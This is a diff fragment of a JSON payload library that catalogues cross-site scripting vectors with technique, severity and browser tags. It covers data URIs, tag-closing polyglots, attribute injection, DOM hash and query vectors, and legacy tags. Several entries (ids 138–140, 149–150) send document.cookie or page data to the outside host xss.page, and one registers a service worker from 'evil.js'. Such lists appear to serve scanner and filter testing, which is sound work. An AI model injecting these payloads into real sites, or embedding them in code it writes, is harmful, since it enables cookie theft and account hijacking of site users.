+      "description": "Blink tag (deprecated)",
+      "severity": "low",
+      "browsers": [
+        "legacy"
+      ]
+    },
+    {
+      "id": 115,
+      "payload": "<applet code=\"JavaScript:alert(1)\">",
+      "category": "advanced",
+      "technique": "applet",
+      "context": "html",
+      "description": "Applet tag",
+      "severity": "medium",
+      "browsers": [
+        "legacy"
+      ]
+    },
+    {
+      "id": 116,
+      "payload": "<layer onmouseover=alert(1)>Click</layer>",
+      "category": "advanced",
+      "technique": "layer",
+      "context": "html",
+      "description": "Layer tag (Netscape)",
+      "severity": "low",
+      "browsers": [
+        "netscape"
+      ]
+    },
+    {
+      "id": 117,
+      "payload": "<ilayer onmouseover=alert(1)>Click</ilayer>",
+      "category": "advanced",
+      "technique": "ilayer",
+      "context": "html",
+      "description": "ILayer tag (Netscape)",
+      "severity": "low",
+      "browsers": [
+        "netscape"
+      ]
+    },
+    {
+      "id": 118,
+      "payload": "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
+      "category": "data-uri",
+      "technique": "data-html",
+      "context": "html",
+      "description": "Data URI with HTML",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 119,
+      "payload": "<object data=\"data:text/html,<script>alert(1)</script>\">",
+      "category": "data-uri",
+      "technique": "data-object",
+      "context": "html",
+      "description": "Object with data URI",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 120,
+      "payload": "<embed src=\"data:text/html,<script>alert(1)</script>\">",
+      "category": "data-uri",
+      "technique": "data-embed",
+      "context": "html",
+      "description": "Embed with data URI",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 121,
+      "payload": "<script src=\"data:text/javascript,alert(1)\"></script>",
+      "category": "data-uri",
+      "technique": "data-script",
+      "context": "html",
+      "description": "Script with data URI",
+      "severity": "critical",
+      "browsers": [
+        "firefox"
+      ]
+    },
+    {
+      "id": 122,
+      "payload": "<!--<script>alert(1)</script>-->",
+      "category": "comment",
+      "technique": "comment-script",
+      "context": "html",
+      "description": "Script inside HTML comment",
+      "severity": "low",
+      "browsers": [
+        "ie"
+      ]
+    },
+    {
+      "id": 123,
+      "payload": "<!--[if gte IE 4]><script>alert(1)</script><![endif]-->",
+      "category": "comment",
+      "technique": "conditional-comment",
+      "context": "html",
+      "description": "IE conditional comment",
+      "severity": "medium",
+      "browsers": [
+        "ie"
+      ]
+    },
+    {
+      "id": 124,
+      "payload": "<meta http-equiv=\"refresh\" content=\"0;javascript:alert(1)\">",
+      "category": "meta",
+      "technique": "meta-refresh-js",
+      "context": "html",
+      "description": "Meta refresh with JavaScript",
+      "severity": "high",
+      "browsers": [
+        "ie"
+      ]
+    },
+    {
+      "id": 125,
+      "payload": "\">'><script>alert(1)</script>",
+      "category": "polyglot",
+      "technique": "attribute-break",
+      "context": "multi",
+      "description": "Break attribute and inject script",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 126,
+      "payload": "</script><script>alert(1)</script>",
+      "category": "polyglot",
+      "technique": "script-close",
+      "context": "multi",
+      "description": "Close script and inject new",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 127,
+      "payload": "</style><script>alert(1)</script>",
+      "category": "polyglot",
+      "technique": "style-close",
+      "context": "multi",
+      "description": "Close style and inject script",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 128,
+      "payload": "</title><script>alert(1)</script>",
+      "category": "polyglot",
+      "technique": "title-close",
+      "context": "multi",
+      "description": "Close title and inject script",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 129,
+      "payload": "</textarea><script>alert(1)</script>",
+      "category": "polyglot",
+      "technique": "textarea-close",
+      "context": "multi",
+      "description": "Close textarea and inject script",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 130,
+      "payload": "</noscript><script>alert(1)</script>",
+      "category": "polyglot",
+      "technique": "noscript-close",
+      "context": "multi",
+      "description": "Close noscript and inject script",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 131,
+      "payload": "<script>alert(1)//\\",
+      "category": "bypass",
+      "technique": "comment-escape",
+      "context": "html",
+      "description": "Comment with escape",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 132,
+      "payload": "<script>/**/alert(1)</script>",
+      "category": "bypass",
+      "technique": "comment-padding",
+      "context": "html",
+      "description": "Comment padding",
+      "severity": "low",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 133,
+      "payload": "#<img src=x onerror=alert(1)>",
+      "category": "dom",
+      "technique": "hash",
+      "context": "dom",
+      "description": "Hash-based DOM XSS",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 134,
+      "payload": "?q=<script>alert(1)</script>",
+      "category": "dom",
+      "technique": "query",
+      "context": "dom",
+      "description": "Query parameter DOM XSS",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 135,
+      "payload": "<a href=\"javascript:alert(1)\">Click me</a>",
+      "category": "interaction",
+      "technique": "href-click",
+      "context": "html",
+      "description": "Requires user click",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 136,
+      "payload": "<form><button formaction=javascript:alert(1)>Click</button>",
+      "category": "interaction",
+      "technique": "formaction-click",
+      "context": "html",
+      "description": "Formaction requires click",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 137,
+      "payload": "<script>alert(1)</script>",
+      "category": "content-type",
+      "technique": "xhtml",
+      "context": "xhtml",
+      "description": "XHTML context",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 138,
+      "payload": "<script>fetch(\"//xss.page?\"+document.cookie)</script>",
+      "category": "modern",
+      "technique": "fetch-exfil",
+      "context": "html",
+      "description": "Fetch API exfiltration",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 139,
+      "payload": "<script>new Image().src=\"//xss.page?\"+document.cookie</script>",
+      "category": "modern",
+      "technique": "image-exfil",
+      "context": "html",
+      "description": "Image-based exfiltration",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 140,
+      "payload": "<script>navigator.sendBeacon(\"//xss.page\",document.cookie)</script>",
+      "category": "modern",
+      "technique": "beacon-exfil",
+      "context": "html",
+      "description": "Beacon API exfiltration",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 141,
+      "payload": "<script>XMLHttpRequest.prototype.open=function(){alert(1)}</script>",
+      "category": "modern",
+      "technique": "xhr-hijack",
+      "context": "html",
+      "description": "XHR prototype hijacking",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 142,
+      "payload": "<script>Object.defineProperty(document,\"cookie\",{get:function(){alert(1)}})</script>",
+      "category": "modern",
+      "technique": "cookie-getter",
+      "context": "html",
+      "description": "Cookie getter override",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 143,
+      "payload": "<script>navigator.serviceWorker.register(\"evil.js\")</script>",
+      "category": "modern",
+      "technique": "service-worker",
+      "context": "html",
+      "description": "Service worker registration",
+      "severity": "critical",
+      "browsers": [
+        "modern"
+      ]
+    },
+    {
+      "id": 144,
+      "payload": "<script>performance.mark(\"xss\")</script>",
+      "category": "modern",
+      "technique": "performance-api",
+      "context": "html",
+      "description": "Performance timing",
+      "severity": "low",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 145,
+      "payload": "\" onfocus=alert(1) autofocus=\"",
+      "category": "attribute",
+      "technique": "attribute-injection",
+      "context": "attribute",
+      "description": "Inject event attribute",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 146,
+      "payload": "\" onmouseover=alert(1) \"",
+      "category": "attribute",
+      "technique": "mouseover-injection",
+      "context": "attribute",
+      "description": "Mouse event injection",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 147,
+      "payload": "\" onbegin=alert(1) \"",
+      "category": "attribute",
+      "technique": "onbegin-injection",
+      "context": "attribute",
+      "description": "Begin event injection",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 148,
+      "payload": "<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0]))</script>",
+      "category": "modern",
+      "technique": "wasm",
+      "context": "html",
+      "description": "WebAssembly instantiation",
+      "severity": "high",
+      "browsers": [
+        "modern"
+      ]
+    },
+    {
+      "id": 149,
+      "payload": "<style>@import url(//xss.page/?data);</style>",
+      "category": "css",
+      "technique": "css-import-exfil",
+      "context": "html",
+      "description": "CSS import for data exfil",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 150,
+      "payload": "<style>*{background:url(//xss.page/?data)}</style>",
+      "category": "css",
+      "technique": "css-bg-exfil",
+      "context": "html",
+      "description": "CSS background for data exfil",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    }
+  ]
+}
